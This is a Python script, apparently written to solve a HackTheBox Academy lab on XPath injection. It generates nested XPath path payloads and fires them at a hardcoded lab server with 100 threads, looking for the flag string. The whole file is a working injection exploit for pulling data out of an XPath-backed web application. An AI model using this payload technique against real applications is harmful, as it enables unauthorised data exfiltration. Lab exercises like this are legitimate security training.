#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'XPath - Advanced Data Exfiltration' for the module called 'Injection Attacks'. 
This script exploits an XPATH Injection to exfiltrate data.
"""

import requests
import urllib3
import concurrent.futures

# Create a parameter list
def paramlist():
    param=[]
    for num in range(1,10):
        for num2 in range(1,10):
            for num3 in range(1,10):
                for num4 in range(1,10):
                    payload_param=f"q=test&f=test|/*[1]/*[{num}]/*[{num2}]/*[{num3}]/*[{num4}]"
                    param.append(payload_param)
    return param

# Function to use XPATH Injection to Exfiltrate the flag
def exfiltrate(param):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target=f"83.136.255.235:40813"
    proxies= {"http":"http://127.0.0.1:8080"}
    headers={"foo":"bar"}
    response= requests.get(url=f"http://{target}/index.php", proxies=proxies, headers=headers, params=param, allow_redirects=True, verify=False)            
    if "HTB{" in response.text.upper():
        return param
    else:
        return None

# Increase speed with multithreading
def increase_speed():
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        param_list= paramlist()
        future_to_test= {executor.submit(exfiltrate, param): param for param in param_list}
        for future in concurrent.futures.as_completed(future_to_test):          
            result= future.result()
            if result is not None:
                print(f"{result}") 

try:
    increase_speed()
except KeyboardInterrupt:
    print("ctrl +c detected, exiting gracefully")
